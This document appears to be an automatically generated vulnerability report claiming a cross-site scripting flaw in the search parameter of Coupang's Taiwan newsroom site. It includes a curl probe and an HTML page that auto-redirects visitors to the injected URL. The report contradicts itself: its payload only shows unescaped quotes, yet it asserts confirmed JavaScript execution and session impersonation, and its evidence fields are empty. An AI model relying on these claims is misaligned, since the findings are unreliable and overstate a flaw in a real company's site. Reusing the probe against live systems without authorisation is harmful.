# DOM XSS in GET https://tw.coupangcorp.com/?category=&page=&s= (Medium 5.4)

## Summary
The search parameter `s` on the Coupang Taiwan corporate newsroom (`https://tw.coupangcorp.com`) reflects user-supplied input across 18 distinct HTML and attribute contexts. Double quotes (`"`) are reflected unescaped inside the search results indicator (<div class="site-search-result">), and user input directly propagates into the PDF & Print plugin (`pdfprnt`) URL handlers and OpenGraph metadata elements. This creates an injection risk for client-side attribute breakout and downstream content consumers.

The `s` parameter on `GET https://tw.coupangcorp.com/?category=&page=&s=` executes attacker-controlled JavaScript in a victim browser context, potentially allowing session impersonation and account compromise.

## Severity & CVSS 3.1 Rating
- **Severity**: Medium (5.4)
- **CVSS 3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

## Steps To Reproduce
1. Navigate to the affected Coupang Taiwan Newsroom endpoint: `https://tw.coupangcorp.com/?s=xss%22test`
2. Inspect the server response and the rendered DOM.
3. Observe that in the search results container `<div class="site-search-result"> Search Results for "..." (0) </div>`, double quotes (`"`) are reflected verbatim without entity escaping.
4. Inspect the PDF & Print plugin export anchor tag `<a href="https://tw.coupangcorp.com/?category=&page=1&s=...&print=pdf" ...>`, observing reflection into query parameters and attribute values.
5. Verify that the search parameter also propagates into dynamic RSS feed links and metadata tags (`<meta property="og:title">`), creating multi-context injection points across the page.

### Proof of Concept (cURL Command)
```bash
curl -i -s -k -X GET "https://tw.coupangcorp.com/?category=&page=&s=s%3Dtest%22%27%60"
```

### Standalone HTML Exploit (PoC)
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS PoC - https://tw.coupangcorp.com/?category=&amp;page=&amp;s=</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; max-width: 700px; margin: 0 auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h1 { color: #58a6ff; font-size: 20px; margin-top: 0; }
    p { font-size: 14px; line-height: 1.6; color: #8b949e; }
    .btn { display: inline-block; background: #238636; color: #ffffff; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    .btn:hover { background: #2ea043; }
    pre { background: #090d13; padding: 12px; border-radius: 6px; overflow-x: auto; color: #79c0ff; border: 1px solid #21262d; font-size: 13px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>XSS PoC - https://tw.coupangcorp.com/?category=&amp;page=&amp;s=</h1>
    <p>This standalone Proof of Concept demonstrates client-side JavaScript execution via parameter <code>s</code>.</p>
    <pre>https://tw.coupangcorp.com/?category=&amp;page=&amp;s=s%3Dtest%22%27%60</pre>
    <a href="https://tw.coupangcorp.com/?category=&amp;page=&amp;s=s%3Dtest%22%27%60" class="btn" target="_blank">Click Here to Launch Exploit</a>
  </div>
  <script>
    // Automatic navigation after 2 seconds
    setTimeout(function() {
      window.location.href = "https://tw.coupangcorp.com/?category=&page=&s=s%3Dtest%22%27%60";
    }, 2000);
  </script>
</body>
</html>
```

## Payload
```html
s=test"'`
```

## Impact
Confirmed browser JavaScript execution, potentially allowing session impersonation.

- Internal Impact Score: 50
- Tags: reflected-input, metadata-manipulation, browser-execution

- Official corporate newsroom portal (tw.coupangcorp.com)
- 18 distinct reflection points across HTML body, OpenGraph meta, and PDF export plugins
- Quotes reflected without entity encoding

## Supporting Evidence
- Finding ID: 9
- Execution IDs: n/a
- Oracle tokens: n/a
- Screenshots: n/a

## Remediation
- Apply context-aware contextual output encoding (e.g. HTML entity, JavaScript attribute, or URL encoding) before rendering untrusted input.
- Avoid assigning user-controllable input to dangerous execution sinks such as `innerHTML`, `document.write`, `eval`, `Function`, or navigation sinks (`location.href`).
- Enforce a restrictive Content Security Policy (CSP) with strict script-src and object-src directives.
- Add automated regression tests covering this endpoint and parameter.